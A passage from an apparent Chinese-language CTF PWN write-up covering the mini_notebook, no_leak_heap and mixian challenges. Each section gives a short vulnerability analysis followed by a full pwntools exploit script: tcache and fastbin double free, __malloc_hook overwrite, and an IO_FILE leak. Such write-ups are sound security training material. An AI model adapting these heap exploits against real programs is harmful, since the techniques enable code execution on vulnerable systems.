orw_rop64(pop_rdi,pop_rsi,pop_rdx_rbx,heap_addr,openat_addr,read_addr,write_addr)<br>se(payload)<br><br>op()<br></code></pre></td></tr></table></figure><h3 id="mini-notebook"><a href="#mini-notebook" class="headerlink" title="mini_notebook"></a><strong>mini_notebook</strong></h3><p>​check:</p><p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431244048.png"></p><p>​保护全开</p><p>​漏洞点：</p><p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431311058.png"></p><p>​uaf漏洞。</p><p>​思路：</p><p>​通过tcache的double free打tcache头暴露libc基地址，然后打malloc_hook。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br><span class="hljs-comment">#p = remote(&#123;IP&#125;)</span><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    sela(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>,stre(<span class="hljs-number">1</span>))<br>    sela(<span class="hljs-string">b&quot;size???&quot;</span>,stre(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>():<br>    sela(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>,stre(<span class="hljs-number">2</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    sela(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>,stre(<span class="hljs-number">3</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">content</span>):<br>    sela(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>,stre(<span class="hljs-number">4</span>))<br>    sea(<span class="hljs-string">b&quot;content???&quot;</span>,content)<br><br>add(<span class="hljs-number">0x38</span>)<br>dele()<br><br>edit(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br>dele()<br><br>show()<br>heap_base = raddr64() - <span class="hljs-number">0x2a0</span><br>ph(heap_base,<span class="hljs-string">&quot;heap_base&quot;</span>)<br><br>edit(p64(heap_base+<span class="hljs-number">0x30</span>))<br>add(<span class="hljs-number">0x28</span>)<br>dele()<br>add(<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">0x38</span>)<br>edit(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>+p64(<span class="hljs-number">0x7000000000000</span>))<br>add(<span class="hljs-number">0x38</span>)<br>dele()<br>edit(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br>dele()<br><br>edit(p64(heap_base+<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x38</span>)<br>add(<span class="hljs-number">0x38</span>)<br>dele()<br><br>show()<br>libc_base = raddr64() - <span class="hljs-number">0x1ecbe0</span><br>ph(libc_base,<span class="hljs-string">&quot;libc_base&quot;</span>)<br>malloc_hook = libc_base + libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>one = libc_base + <span class="hljs-number">0xe3b01</span><br><br>edit(p64(<span class="hljs-number">0x30000</span>))<br>add(<span class="hljs-number">0x28</span>)<br>dele()<br>edit(p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br>dele()<br>add(<span class="hljs-number">0x28</span>)<br>edit(p64(malloc_hook))<br>add(<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x28</span>)<br>edit(p64(one))<br>add(<span class="hljs-number">0x28</span>)<br><br>op()<br></code></pre></td></tr></table></figure><h3 id="no-leak-heap"><a href="#no-leak-heap" class="headerlink" title="no_leak_heap"></a><strong>no_leak_heap</strong></h3><p>​check：</p><p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431732423.png"></p><p>​除了PIE其他保护全开。</p><p>​漏洞点：</p><ol><li></li></ol><p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431818549.png"></p><p>​存在uaf漏洞。</p><ol start="2"><li></li></ol><p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431867320.png"></p><p>​主动泄露堆地址。</p><ol start="3"><li></li></ol><p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732431916114.png"></p><p>​后门函数。</p><p>​思路：</p><p>​通过申请大块在堆块上残留libc地址，改其末尾为0x4aed申请到malloc_hook上，修改malloc_hook到后门完成getshell。</p><p>​exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br><span class="hljs-comment">#p = remote(&#123;IP&#125;)</span><br>p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    sela(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>,stre(<span class="hljs-number">1</span>))<br>    sela(<span class="hljs-string">b&quot;idx???&quot;</span>,stre(index))<br>    sela(<span class="hljs-string">b&quot;size???&quot;</span>,stre(size))<br>    sea(<span class="hljs-string">b&quot;content???&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br>    sela(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>,stre(<span class="hljs-number">2</span>))<br>    sela(<span class="hljs-string">b&quot;idx???&quot;</span>,stre(index))<br><br>reu(<span class="hljs-string">b&quot;: &quot;</span>)<br>heap_base = <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;\n&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x21000</span><br>ph(heap_base,<span class="hljs-string">&quot;heap_base&quot;</span>)<br><br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x68</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>))<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x300</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;B&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;C&quot;</span>*<span class="hljs-number">0x8</span>)<br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">9</span>)<br><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>,p64(heap_base+<span class="hljs-number">0x30</span>))<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0x3F0</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0x71</span>) + p16(<span class="hljs-number">0x4aed</span>))<br><br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br>dele(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x68</span>,p64(heap_base+<span class="hljs-number">0x90</span>))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">11</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;S&quot;</span>*<span class="hljs-number">0x8</span>)<br>add(<span class="hljs-number">12</span>,<span class="hljs-number">0x68</span>,p16(<span class="hljs-number">0x4aed</span>))<br><br>add(<span class="hljs-number">13</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x13</span> + p64(<span class="hljs-number">0x400AA6</span>))<br><br>sela(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>,stre(<span class="hljs-number">1</span>))<br>sela(<span class="hljs-string">b&quot;idx???&quot;</span>,stre(<span class="hljs-number">14</span>))<br>sela(<span class="hljs-string">b&quot;size???&quot;</span>,stre(<span class="hljs-number">0x20</span>))<br><br>op()<br></code></pre></td></tr></table></figure><h3 id="mixian"><a href="#mixian" class="headerlink" title="mixian"></a><strong>mixian</strong></h3><p>​check:</p><p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732432521110.png"></p><p>​保护全开。</p><p>​漏洞点：</p><p><img src="/2024/11/24/%E8%9C%80%E9%81%93%E5%B1%B1CTF-PWN%E5%85%A8%E8%A7%A3WP/1732432587514.png"></p><p>​num可以为负数，我们可以申请question_list到stdout的位置，修改stdou为经典的IO_FILE attck获得libc基地址。</p><p>num设置为3则正好可以修改最终判断的变量，通过libc基地址算出puts的地址加上rand()%0x2333的值就能完成getshell。</p><p>​exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + 